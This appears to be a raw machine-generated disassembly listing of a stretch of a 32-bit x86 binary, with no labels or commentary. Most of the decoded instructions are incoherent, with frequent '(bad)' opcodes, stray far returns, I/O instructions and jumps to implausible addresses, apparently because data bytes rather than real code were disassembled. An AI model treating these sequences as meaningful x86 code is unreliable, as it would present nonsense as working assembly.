  40a445:	mov    ecx,DWORD PTR [ebp-0x4]
  40a448:	xor    edx,DWORD PTR [edx+0x7201b8]
  40a44e:	add    BYTE PTR [edx],dl
  40a450:	enter  0x4d90,0x0
  40a454:	mov    eax,DWORD PTR [eax]
  40a456:	hlt    
  40a457:	add    al,0xa5
  40a459:	mov    al,0xff
  40a45b:	add    bh,bh
  40a45d:	add    BYTE PTR [ebx],dh
  40a45f:	inc    DWORD PTR [ebx]
  40a461:	sbb    al,0x89
  40a463:	jne    0x40a43d
  40a465:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40a46b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40a471:	mov    DWORD PTR [eax-0x70],0xee58e189
  40a478:	inc    DWORD PTR [ebp-0x75]
  40a47b:	ror    DWORD PTR [esp+ebp*8],1
  40a47e:	test   DWORD PTR [esi-0x1],esp
  40a481:	inc    ebp
  40a482:	(bad)  
  40a483:	aas    
  40a484:	inc    ebp
  40a485:	(bad)  
  40a486:	lea    edi,[esp+eiz*2-0x1]
  40a48a:	push   DWORD PTR [edi]
  40a48c:	mov    DWORD PTR [ecx],esi
  40a48e:	mov    al,ds:0x8b8000c7
  40a493:	out    dx,al
  40a494:	cld    
  40a495:	call   0xed3fea27
  40a49a:	(bad)  
  40a49b:	fisttp WORD PTR [eax+0x8801c7]
  40a4a1:	jmp    0x40a4e8
  40a4a3:	out    dx,al
  40a4a4:	inc    DWORD PTR [ebp-0x4]
  40a4a7:	xlat   BYTE PTR ds:[ebx]
  40a4a8:	lea    edi,[edi]
  40a4aa:	inc    edi
  40a4ac:	jmp    FWORD PTR [eax-0x78]
  40a4af:	inc    DWORD PTR [ecx]
  40a4b1:	aaa    
  40a4b2:	add    BYTE PTR [ecx],dh
  40a4b4:	pop    ecx
  40a4b5:	mov    DWORD PTR [eax],0xfff856c
  40a4bb:	ffreep st(5)
  40a4bd:	aas    
  40a4be:	add    bh,al
  40a4c0:	mov    esi,DWORD PTR [eax-0x4]
  40a4c3:	inc    DWORD PTR [eax+0xdf01ec]
  40a4c9:	(bad)  
  40a4ca:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40a4ce:	mov    esp,ebx
  40a4d0:	xchg   esp,eax
  40a4d1:	rol    DWORD PTR [eax],cl
  40a4d3:	(bad)  
  40a4d4:	mov    edi,DWORD PTR [eax+0x3]
  40a4d7:	(bad)  
  40a4d8:	cmp    al,0xd7
  40a4da:	dec    ebp
  40a4db:	lds    ecx,FWORD PTR [ebx+0x2ad8e8]
  40a4e1:	add    BYTE PTR [ebp-0x3b375],cl
  40a4e7:	adc    BYTE PTR [edx+0x1],0x55
  40a4eb:	add    BYTE PTR [ebx+0x6c8c30],cl
  40a4f1:	add    BYTE PTR [ebx-0x778afc7b],cl
  40a4f7:	mov    eax,DWORD PTR [eax]
  40a4f9:	cld    
  40a4fa:	push   0x7d
  40a4fc:	dec    DWORD PTR [ebx+0xd88c]
  40a502:	push   edx
  40a503:	mov    edx,DWORD PTR [ecx-0x4]
  40a506:	call   DWORD PTR [eax+0x7d01fc]
  40a50c:	mov    ecx,DWORD PTR [ebx+0x509000fc]
  40a512:	add    DWORD PTR [esi+0x0],edx
  40a515:	test   DWORD PTR [ebp+0x75],eax
  40a518:	call   0xc83d85a8
  40a51d:	jge    0x40a4b3
  40a51f:	mov    ebp,ebx
  40a521:	fcom   st(7)
  40a523:	add    bh,al
  40a525:	mov    ebx,DWORD PTR [eax-0x7a6f8304]
  40a52b:	add    edi,edi
  40a52d:	add    bh,bh
  40a52f:	imul   esp,ecx,0x4550d400
  40a535:	push   esi
  40a536:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40a53c:	test   BYTE PTR [ebx],dh
  40a53e:	aam    0x5
  40a540:	retf   0x4572
  40a543:	add    bl,ah
  40a545:	rcl    ebx,0x84
  40a548:	mov    DWORD PTR [ecx],0x46d1008c
  40a54e:	jl     0x40a550
  40a550:	test   edi,eax
  40a552:	jmp    esp
  40a554:	inc    DWORD PTR [eax]
  40a556:	loope  0x40a558
  40a558:	aam    0x75
  40a55a:	test   DWORD PTR [ebx+0x45fffcff],ecx
  40a560:	out    dx,al
  40a561:	mov    ebp,eax
  40a563:	mov    ah,0x85
  40a565:	add    bh,bh
  40a567:	call   0x114d06b
  40a56c:	retf   0x858b
  40a56f:	cld    
  40a570:	inc    DWORD PTR [eax+0xeb01ff]
  40a576:	out    dx,al
  40a577:	xor    BYTE PTR [ebp-0xff001e],al
  40a57d:	mov    edx,ecx
  40a57f:	cld    
  40a580:	jl     0x40a50b
  40a582:	mov    edx,0x50000001
  40a587:	add    DWORD PTR [ebp+0x45],eax
  40a58a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40a590:	dec    DWORD PTR [ebx-0x3fd80318]
  40a596:	add    BYTE PTR [ebp-0xbf0040],dl
  40a59c:	inc    ebp
  40a59d:	xor    DWORD PTR [ebx-0x4faf0400],ecx
  40a5a3:	inc    ebp
  40a5a4:	add    DWORD PTR [ebx+0x459c00],ecx
  40a5aa:	mov    edi,edi
  40a5ac:	mov    eax,0xe80800ff
  40a5b1:	inc    ebp
  40a5b2:	sub    cl,BYTE PTR [ebx-0x47000400]
  40a5b8:	add    al,0x1
  40a5ba:	rol    BYTE PTR [eax],0x1e
  40a5bd:	jne    0x40a604
  40a5bf:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40a5c5:	inc    DWORD PTR [ecx]
  40a5c7:	call   0x85cfcc
  40a5cc:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40a5d2:	call   0x40cfd8
  40a5d7:	xor    bh,bh
  40a5d9:	push   edi
  40a5da:	adc    BYTE PTR [ebx-0x747423bb],al
  40a5e0:	loopne 0x40a5be
  40a5e2:	ret    
  40a5e3:	loopne 0x40a583
  40a5e5:	xor    DWORD PTR [edx],0x31
  40a5e8:	cmp    edi,edi
  40a5ea:	bswap  esp
  40a5ec:	rol    BYTE PTR gs:[eax],0x5
  40a5f0:	jmp    0x12ba73a
  40a5f5:	mov    eax,DWORD PTR [ebp-0x4]
  40a5f8:	add    BYTE PTR [eax+0xff0100],bh
  40a5fe:	cld    
  40a5ff:	jne    0x40a67e
  40a601:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40a607:	mov    DWORD PTR [ecx],0x30500000
  40a60d:	inc    ebp
  40a60e:	add    BYTE PTR [ebx+0x459850],cl
  40a614:	mov    edi,edi
  40a616:	test   al,0xff
  40a618:	add    BYTE PTR [eax],cl
  40a61a:	inc    DWORD PTR [ebp-0x18]
  40a61d:	jmp    DWORD PTR [esi]
  40a61f:	fadd   QWORD PTR [eax]
  40a621:	jge    0x40a670
  40a623:	adc    BYTE PTR [ebx+0x459cb9],cl
  40a629:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40a62f:	sahf   
  40a630:	mov    eax,0x30132
  40a635:	lea    esi,[ebp+0x2c]
  40a638:	xor    edi,edi
  40a63a:	(bad)  
  40a63b:	call   0x13fcfa8
  40a640:	call   0x134d0d0
  40a645:	jne    0x40a5d2
  40a647:	xor    edi,esp
  40a649:	add    eax,DWORD PTR [eax+0xc018d]
  40a64f:	push   DWORD PTR [eax]
  40a651:	call   0xc9cfad
  40a656:	int3   
  40a657:	inc    DWORD PTR [ebp-0x14]
  40a65a:	mov    ecx,DWORD PTR [ebp-0x28]
  40a65d:	xor    eax,DWORD PTR [eax]
  40a65f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40a665:	(bad)  
  40a666:	xchg   ebp,eax
  40a667:	in     al,0xff
  40a669:	add    bh,bh
  40a66b:	add    BYTE PTR [esi],al
  40a66d:	inc    ebp
  40a66e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40a674:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff62]
  40a67b:	mov    edi,edi
  40a67d:	or     BYTE PTR [eax],cl
  40a67f:	inc    ebp
  40a680:	test   DWORD PTR gs:[eax],eax
  40a683:	je     0x40a6ca
  40a685:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40a68b:	xor    edx,DWORD PTR [eax-0x73]
  40a68e:	push   ebp
  40a68f:	or     BYTE PTR [ebp+0x21007572],al
  40a695:	inc    ebp
  40a696:	in     al,dx
  40a697:	mov    ebp,DWORD PTR [eax]
  40a699:	mov    esp,0x628bc345
  40a69e:	fmul   st,st(5)
  40a6a0:	add    BYTE PTR [ebx],ch
  40a6a2:	mov    eax,DWORD PTR [ebx]
  40a6a4:	cld    
  40a6a5:	loopne 0x40a667
  40a6a7:	inc    ebp
  40a6a8:	push   ebp
  40a6a9:	cmp    ebp,eax
  40a6ab:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  40a6b2:	cld    
  40a6b3:	fadd   DWORD PTR [eax+0x3b014d]
  40a6b9:	jne    0x40a6eb
  40a6bb:	push   0xf8898557
  40a6c0:	in     al,dx
  40a6c1:	jne    0x40a708
  40a6c3:	lea    eax,[ebx+0x72e8dcc8]
  40a6c9:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  40a6cf:	jmp    0x40a704
  40a6d1:	mov    edi,DWORD PTR [edi+0x4572bc]
  40a6d7:	xor    eax,edi
  40a6d9:	adc    DWORD PTR [ebp-0xcd0062],0x8b9231
  40a6e3:	rcl    BYTE PTR [eax-0x40],1
  40a6e6:	inc    ebp
  40a6e7:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40a6ef:	inc    ebp
  40a6f0:	xchg   ebp,eax
  40a6f1:	ud0    ebp,DWORD PTR [ebx]
  40a6f4:	inc    DWORD PTR [eax]
  40a6f6:	jl     0x40a76e
  40a6f8:	add    BYTE PTR [edx+0x1f558050],cl
  40a6fe:	mov    ecx,DWORD PTR [esp+esi*8]
  40a701:	inc    eax
  40a702:	retf   
  40a703:	inc    ebp
  40a704:	iret   
  40a705:	jb     0x40a6cf
  40a707:	mov    eax,DWORD PTR [edi]
  40a709:	enter  0x4545,0x1
  40a70d:	xor    eax,0x898b9c00
  40a712:	mov    esp,0x33344df0
  40a717:	pushf  
  40a718:	lea    ecx,[ecx+0x4d72e008]
  40a71e:	add    BYTE PTR [ebx],dh
  40a720:	inc    ebp
  40a721:	mov    DWORD PTR [ebx-0x3f611b4c],ecx
  40a727:	xor    dl,BYTE PTR [edx]
  40a729:	add    eax,DWORD PTR [ebp-0x77]
  40a72c:	mov    eax,esp
  40a72e:	fmul   DWORD PTR [ebp-0x3d]
  40a731:	xor    eax,DWORD PTR [ebx+eax*1+0x832899e]
  40a738:	mov    DWORD PTR [ebp-0x28],eax
  40a73b:	aad    0x45
  40a73d:	pushf  
  40a73e:	xor    eax,edi
  40a740:	mov    ecx,0xff858db0
  40a745:	clc    
  40a746:	enter  0x4d45,0x32
  40a74a:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40a751:	test   esi,edi
  40a753:	clc    
  40a754:	inc    DWORD PTR [ebp+0x45]
  40a757:	xor    BYTE PTR [ebx-0x3738f764],cl
  40a75d:	test   al,0x16
  40a75f:	test   DWORD PTR ds:0xff459cf8,esi
  40a765:	ds cld 
  40a767:	pushf  
  40a768:	inc    ebp
  40a769:	mov    edx,DWORD PTR [eax-0x28]
  40a76c:	outs   dx,DWORD PTR ds:[esi]
  40a76d:	push   ebp
  40a76e:	add    BYTE PTR [ebx],dh
  40a770:	mov    DWORD PTR [ebx],eax
  40a772:	sar    BYTE PTR [ebx],1
  40a774:	adc    BYTE PTR [edi],cl
  40a776:	dec    ebp
  40a777:	adc    al,0x8b
  40a779:	add    al,dl
  40a77b:	jmp    0x101a94b
  40a780:	jb     0x40a7cf
  40a782:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40a788:	xor    ecx,DWORD PTR [ebp+0x3b]
  40a78b:	xor    ecx,DWORD PTR [edi]
  40a78d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40a791:	(bad)  
  40a793:	clc    
  40a794:	enter  0x8400,0x8b
  40a798:	pop    es
  40a799:	mov    al,0x0
  40a79b:	push   ebp
  40a79c:	push   cs
  40a79d:	xor    ecx,eax
  40a79f:	xor    esp,ecx
  40a7a1:	add    ebp,DWORD PTR [eax]
  40a7a3:	add    esi,DWORD PTR [eax]
  40a7a5:	(bad)  
  40a7a7:	retf   0x55c8
  40a7aa:	repnz mov eax,DWORD PTR [ebp-0x10]
  40a7ae:	(bad)  
  40a7af:	cli    
  40a7b0:	fdivr  st,st(1)
  40a7b2:	test   DWORD PTR [eax+edi*8],ecx
  40a7b5:	dec    ebp
  40a7b6:	inc    ebp
  40a7b7:	xor    edi,DWORD PTR [eax-0x7167afd]
  40a7bd:	add    BYTE PTR [ebp+0x0],al
  40a7c0:	mov    ecx,DWORD PTR [ebp-0x28]
  40a7c3:	mov    ecx,ebx
  40a7c5:	clc    
  40a7c6:	jne    0x40a793
  40a7c8:	mov    esi,0xd672d3
  40a7cd:	into   
  40a7ce:	into   
  40a7cf:	scas   eax,DWORD PTR es:[edi]
  40a7d0:	dec    ebp
  40a7d1:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40a7d7:	sub    ecx,esi
  40a7d9:	cmp    ecx,DWORD PTR [ebp+0x77]
  40a7dc:	(bad)  
  40a7dd:	mov    edi,eax
  40a7df:	mov    al,0x85
  40a7e1:	mov    eax,edi
  40a7e3:	add    BYTE PTR [ebp-0x75],al
  40a7e6:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40a7ed:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40a7f3:	rdtsc  
  40a7f5:	retf   0x559c
  40a7f8:	(bad)  
  40a7f9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40a800:	inc    ebp
  40a801:	add    eax,0xeb9c4d3f
  40a806:	(bad)  
  40a807:	mov    ecx,esp
  40a809:	lods   al,BYTE PTR ds:[esi]
  40a80a:	test   DWORD PTR [ebp-0x8],edx
  40a80d:	xor    ecx,DWORD PTR [ebp+0x33]
  40a810:	mov    eax,DWORD PTR [ebx]
  40a812:	lock add ecx,ebx
  40a815:	bswap  esi
  40a817:	retf   0x55d1
  40a81a:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40a820:	jmp    0x40a81b
  40a822:	add    BYTE PTR ds:0xebc44d8b,al
  40a828:	push   ebp
  40a829:	mov    ebp,DWORD PTR [ebx]
  40a82b:	test   al,0x8b
  40a82d:	push   ebp
  40a82e:	clc    
  40a82f:	xor    ecx,ebx
  40a831:	xor    ecx,esi
  40a833:	add    edx,ecx
  40a835:	add    eax,DWORD PTR [edx+0xca010f]
  40a83b:	push   ebp
  40a83c:	dec    ebp
  40a83d:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40a843:	stc    
  40a844:	rol    DWORD PTR ds:0xebce4dd6,cl
  40a84a:	scas   eax,DWORD PTR es:[edi]
  40a84b:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40a851:	xor    ebp,DWORD PTR [ebx]
  40a853:	xor    edi,DWORD PTR [ebx]
  40a855:	add    esi,DWORD PTR [edi+0x3]
  40a858:	mov    ecx,DWORD PTR [edi]
  40a85a:	clc    
  40a85b:	retf   0x55cb
  40a85e:	into   
  40a85f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40a866:	mov    eax,0x3376554d
  40a86b:	mov    esi,DWORD PTR [ebx]
  40a86d:	int3   
  40a86e:	add    edx,DWORD PTR [ebp+0x3]
  40a871:	xor    ecx,DWORD PTR [edi]
  40a873:	xor    ecx,edx
  40a875:	add    edx,DWORD PTR [ebp+0x3]
  40a878:	mov    ecx,DWORD PTR [edi]
  40a87a:	lock retf 0x4dfa
  40a87e:	stc    
  40a87f:	mov    ecx,DWORD PTR [eax]
  40a881:	or     BYTE PTR [ebp+0x4d],cl
  40a884:	jmp    0x104a914
  40a889:	dec    ebp
  40a88a:	dec    ebp
  40a88b:	(bad)  
  40a88c:	mov    ebx,esp
  40a88e:	clc    
  40a88f:	test   ebx,ecx
  40a891:	clc    
  40a892:	ror    DWORD PTR [ebp-0x2a],cl
  40a895:	mov    esi,ecx
  40a897:	call   0x33cbee4b
  40a89c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40a8a3:	retf   
  40a8a4:	ja     0x40a874
  40a8a6:	mov    ebp,DWORD PTR [eax-0x48]
  40a8a9:	dec    ebp
  40a8aa:	xor    ecx,DWORD PTR [di+0x3]
  40a8ae:	mov    esp,esp
  40a8b0:	clc    
  40a8b1:	push   ebp
  40a8b2:	retf   
  40a8b3:	mov    dl,bl
  40a8b5:	adc    esi,edx
  40a8b7:	jb     0x40a887
  40a8b9:	add    BYTE PTR [edi-0x3b7474b3],ch
  40a8bf:	call   0x4d6c7441
  40a8c4:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40a8ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8cb:	sahf   
  40a8cc:	inc    ebp
  40a8cd:	xor    cl,BYTE PTR [ebp-0x78]
  40a8d0:	mov    edx,edi
  40a8d2:	clc    
  40a8d3:	dec    ebp
  40a8d4:	retf   
  40a8d5:	mov    edx,ebx
  40a8d7:	call   0x560f7cb2
  40a8dc:	scas   eax,DWORD PTR es:[edi]
  40a8dd:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40a8e3:	sahf   
  40a8e4:	sub    esi,DWORD PTR [edx]
  40a8e6:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40a8ec:	lods   al,BYTE PTR ds:[esi]
  40a8ed:	xor    esp,DWORD PTR [ebx]
  40a8ef:	add    ecx,DWORD PTR [ebp-0x1c]
  40a8f2:	mov    edi,DWORD PTR [ebp-0x8]
  40a8f5:	mov    bl,cl
  40a8f7:	cmp    dl,bl
  40a8f9:	jb     0x40a8c9
  40a8fb:	add    dh,dl
  40a8fd:	dec    ebp
  40a8fe:	scas   eax,DWORD PTR es:[edi]
  40a8ff:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40a905:	shr    DWORD PTR [ebx],cl
  40a907:	into   
  40a908:	cmp    edx,esi
  40a90a:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40a910:	dec    ebp
  40a911:	dec    ebp
  40a912:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40a918:	retf   
  40a919:	xor    edx,esi
  40a91b:	add    ecx,esi
  40a91d:	imul   ecx,edx
  40a920:	mov    DWORD PTR [ebp+0x8],edx
  40a923:	xor    ecx,DWORD PTR [ebp+0x2b]
  40a926:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40a92c:	add    esi,DWORD PTR [ebx]
  40a92e:	mov    ah,0x3
  40a930:	inc    ebp
  40a931:	sysexit 
  40a933:	xlat   BYTE PTR ds:[ebx]
  40a934:	pushf  
  40a935:	jge    0x40a8c0
  40a937:	xor    ebx,eax
  40a939:	sub    eax,DWORD PTR [ebp-0x73]
  40a93c:	(bad)  
  40a93d:	cmp    al,al
  40a93f:	jb     0x40a8c6
  40a941:	add    al,bh
  40a943:	ror    DWORD PTR [ebp-0x7a],1
  40a946:	xor    edi,edi
  40a948:	add    edi,edi
  40a94a:	jmp    0x40a999
  40a94c:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40a952:	dec    ebp
  40a953:	into   
  40a954:	mov    ebp,DWORD PTR [edi-0x23737428]
  40a95a:	sahf   
  40a95b:	shl    DWORD PTR [edx],cl
  40a95d:	retf   0x5588
  40a960:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40a966:	add    eax,DWORD PTR [eax]
  40a968:	in     al,0x4d
  40a96a:	push   ebp
  40a96b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40a971:	bound  eax,QWORD PTR [eax]
  40a973:	int    0x4d
  40a975:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40a97b:	dec    ebp
  40a97c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40a982:	jge    0x40a952
  40a984:	mov    BYTE PTR [edi+0xf723b3a],ch
  40a98a:	add    cl,dh
  40a98c:	dec    ebp
  40a98d:	dec    DWORD PTR [ebx-0x2c032375]
  40a993:	adc    BYTE PTR [ebp+0x1],0x8b
  40a997:	add    al,bl
  40a999:	jge    0x40a927
  40a99b:	push   0xffffff9e
  40a99d:	push   0x8b3032
  40a9a2:	shl    BYTE PTR [ebp+0x55],0x6a
  40a9a6:	xor    edi,edi
  40a9a8:	xor    edx,DWORD PTR [ebx+eax*1]
  40a9ab:	inc    ebp
  40a9ac:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40a9b2:	dec    ebp
  40a9b3:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40a9b9:	jbe    0x40a946
  40a9bb:	mov    ebp,esp
  40a9bd:	ror    bl,1
  40a9bf:	enter  0x14ce,0xaf
  40a9c3:	dec    DWORD PTR [ebx-0x2cef17f8]
  40a9c9:	push   ebp
  40a9ca:	retf   0x5540
  40a9cd:	push   ebp
  40a9ce:	mov    esi,DWORD PTR [edx-0x1c]
  40a9d1:	mov    edx,ebx
  40a9d3:	cld    
  40a9d4:	(bad)  
  40a9d5:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40a9dc:	sti    
  40a9dd:	add    dh,cl
  40a9df:	push   0xffffff94
  40a9e1:	call   FWORD PTR [esi+0x3b5032d0]
  40a9e7:	mov    ecx,DWORD PTR [edi]
  40a9e9:	int3   
  40a9ea:	pop    esi
  40a9eb:	inc    ebp
  40a9ec:	dec    DWORD PTR [ecx+0x45e8c88b]
  40a9f2:	push   ebp
  40a9f3:	xor    esi,DWORD PTR [ebx]
  40a9f5:	mov    DWORD PTR [ebx],0xcacc0f9c
  40a9fb:	aas    
  40a9fc:	push   ebp
  40a9fd:	inc    ebp
  40a9fe:	xor    eax,esp
  40aa00:	add    eax,esp
  40aa02:	mov    eax,DWORD PTR [ebx]
  40aa04:	(bad)  
  40aa05:	jmp    0x40a993
  40aa07:	mov    bl,BYTE PTR [esi-0x7674cdfb]
  40aa0d:	rol    ah,1
  40aa0f:	mov    esi,0xf133104d
  40aa14:	mov    edx,0xff358d80
  40aa19:	mov    dh,0xd1
  40aa1b:	cmp    edx,DWORD PTR [ebp+0xf]
  40aa1e:	mov    eax,DWORD PTR [edx-0x20]
  40aa21:	add    BYTE PTR [ebp-0x75],bh
  40aa24:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40aa2b:	sahf   
  40aa2c:	retf   0x8632
  40aa2f:	cmp    ebp,0x8
  40aa32:	call   ebx
  40aa34:	inc    ebp
  40aa35:	inc    ebp
  40aa36:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40aa3c:	mov    esi,DWORD PTR ds:0xc7049cc8
  40aa42:	add    al,al
  40aa44:	add    bl,al
  40aa46:	(bad)  
  40aa47:	clc    
  40aa48:	enter  0x45,0x35
  40aa4c:	push   eax
  40aa4d:	pushf  
  40aa4e:	mov    edi,eax
  40aa50:	int3   
  40aa51:	or     al,al
  40aa53:	test   DWORD PTR [edi],edi
  40aa55:	clc    
  40aa56:	gs inc ebp
  40aa58:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40aa5e:	push   ss
  40aa5f:	xor    ecx,DWORD PTR [ebp+0x3]
  40aa62:	sub    edx,DWORD PTR [ecx-0x76]
  40aa65:	dec    ebp
  40aa66:	add    DWORD PTR [ebx+0x88d845],ecx
  40aa6c:	mov    esi,DWORD PTR [ebx]
  40aa6e:	or     BYTE PTR [ebx],al
  40aa70:	cmp    edx,DWORD PTR [ecx-0x38]
  40aa73:	dec    ebp
  40aa74:	out    dx,eax
  40aa75:	xor    eax,DWORD PTR [ebp+0x3]
  40aa78:	mov    edx,DWORD PTR [ecx-0x28]
  40aa7b:	dec    ebp
  40aa7c:	add    BYTE PTR [ebx],dh
  40aa7e:	push   0x518003
  40aa83:	push   eax
  40aa84:	add    BYTE PTR [ebx-0x300748b],cl
  40aa8a:	sbb    BYTE PTR [ebp+0x45],cl
  40aa8d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40aa93:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40aa99:	dec    ebp
  40aa9a:	inc    ebp
  40aa9b:	xor    eax,esp
  40aa9d:	add    eax,esp
  40aa9f:	push   ecx
  40aaa0:	(bad)  
  40aaa1:	dec    ebp
  40aaa2:	mov    al,ds:0xc9e031ff
  40aaa7:	retf   
  40aaa8:	(bad)  
  40aaa9:	into   
  40aaaa:	sub    bh,bh
  40aaac:	dec    esp
  40aaad:	adc    al,0x9c
  40aaaf:	inc    ebp
  40aab0:	push   ebp
  40aab1:	test   DWORD PTR [edi],ecx
  40aab3:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab6ff80]
  40aaba:	jmp    0xc9b9b9ce
  40aabf:	add    cl,dl
  40aac1:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40aacb:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40aad1:	rol    BYTE PTR [eax],0x57
  40aad4:	clc    
  40aad5:	bound  esi,QWORD PTR [edx+0x7]
  40aad8:	mov    eax,DWORD PTR [ebp-0x30]
  40aadb:	xor    al,0x40
  40aadd:	sub    al,0xc7
  40aadf:	mov    ah,ch
  40aae1:	add    DWORD PTR [ebp+0x4534f845],eax
  40aae7:	sub    al,0x86
  40aae9:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40aaf0:	mov    ch,0xff
  40aaf2:	clc    
  40aaf3:	add    DWORD PTR [ebp+0x60],0x31
  40aaf7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40aafe:	inc    ebp
  40aaff:	dec    DWORD PTR [ebx-0x341ff701]
  40ab05:	test   esi,ecx
  40ab07:	dec    DWORD PTR [ebx-0x7f8a3301]
  40ab0d:	push   eax
  40ab0e:	add    DWORD PTR [ebp+0x0],eax
  40ab11:	dec    ebx
  40ab13:	or     al,0xce
  40ab15:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40ab1c:	into   
  40ab1d:	add    BYTE PTR [ebx-0x34ff1400],cl
  40ab23:	mov    esi,ecx
  40ab25:	sar    bh,0x45
  40ab28:	adc    al,0x8b
  40ab2a:	clc    
  40ab2b:	fadd   DWORD PTR [ebp+0x0]
  40ab2e:	mov    ebp,DWORD PTR [edx+0x8]
  40ab31:	push   edi
  40ab32:	adc    BYTE PTR [eax+0x1],0x83
  40ab36:	add    al,al
  40ab38:	retf   
  40ab39:	mov    ecx,esi
  40ab3b:	cld    
  40ab3c:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40ab42:	into   
  40ab43:	add    BYTE PTR [ebx+0x756aec00],cl
  40ab49:	jne    0x40ab7e
  40ab4b:	inc    DWORD PTR [ebx]
  40ab4d:	rcl    BYTE PTR [ecx+0x50],1
  40ab50:	push   eax
  40ab51:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40ab57:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40ab5e:	sar    bh,0x84
  40ab61:	or     BYTE PTR [ebx],al
  40ab63:	push   eax
  40ab64:	add    BYTE PTR [ebx+0x4532c845],cl
  40ab6a:	pushf  
  40ab6b:	xor    eax,0x89b49cc7
  40ab70:	test   eax,ebp
  40ab72:	clc    
  40ab73:	inc    ebp
  40ab74:	inc    ebp
  40ab75:	mov    DWORD PTR [eax+eax*8],esi
  40ab78:	sub    al,0x34
  40ab7a:	mov    BYTE PTR [ebx+ecx*4+0x57d8ec89],bl
  40ab81:	dec    ebp
  40ab82:	bound  esi,QWORD PTR [ebx]
  40ab84:	inc    edi
  40ab85:	add    ecx,DWORD PTR [ebx+0x57f4b489]
  40ab8b:	dec    ebp
  40ab8c:	bound  esi,QWORD PTR [ebx]
  40ab8e:	inc    edi
  40ab8f:	add    eax,DWORD PTR [ebx-0xf7a377]
  40ab95:	inc    ebp
  40ab96:	add    ch,dl
  40ab98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab99:	pushf  
  40ab9a:	inc    edi
  40ab9c:	dec    esp
  40ab9e:	lea    eax,[ebp+0x45fff860]
  40aba4:	push   eax
  40aba5:	xor    dh,BYTE PTR [ebp-0x64]
  40aba8:	(bad)  
  40aba9:	(bad)  
  40abaa:	pop    esp
  40abab:	lods   al,BYTE PTR ds:[esi]
  40abac:	inc    DWORD PTR [ebp+0x4508f8ff]
  40abb2:	mov    esi,DWORD PTR [eax]
  40abb4:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40abbb:	test   DWORD PTR [edi-0x8],edx
  40abbe:	inc    esi
  40abbf:	inc    ebp
  40abc0:	add    BYTE PTR [esi],bh
  40abc2:	push   0x8b809c
  40abc7:	in     al,dx
  40abc8:	inc    ebp
  40abc9:	push   ebp
  40abca:	mov    esi,DWORD PTR [ebx]
  40abcc:	cld    
  40abcd:	add    eax,DWORD PTR [eax+0xf013b]
  40abd3:	adc    al,0x0
  40abd5:	add    bh,bh
  40abd7:	jmp    0xbdacf4
  40abdc:	add    BYTE PTR [ebp+0x45],cl
  40abdf:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40abe5:	dec    ebp
  40abe6:	push   0x38033
  40abeb:	cmp    eax,DWORD PTR [eax]
  40abed:	unpcklps xmm7,xmm0
  40abf0:	jne    0x40abf2
  40abf2:	dec    DWORD PTR [ebx+0x5545cc18]
  40abf8:	mov    DWORD PTR [ebx],esi
  40abfa:	shl    BYTE PTR [ebx],1
  40abfc:	inc    ebp
  40abfd:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40ac03:	retf   0x5575
  40ac06:	dec    DWORD PTR [ebx-0x5ba17e8]
  40ac0c:	(bad)  
  40ac0d:	stc    
  40ac0e:	in     al,dx
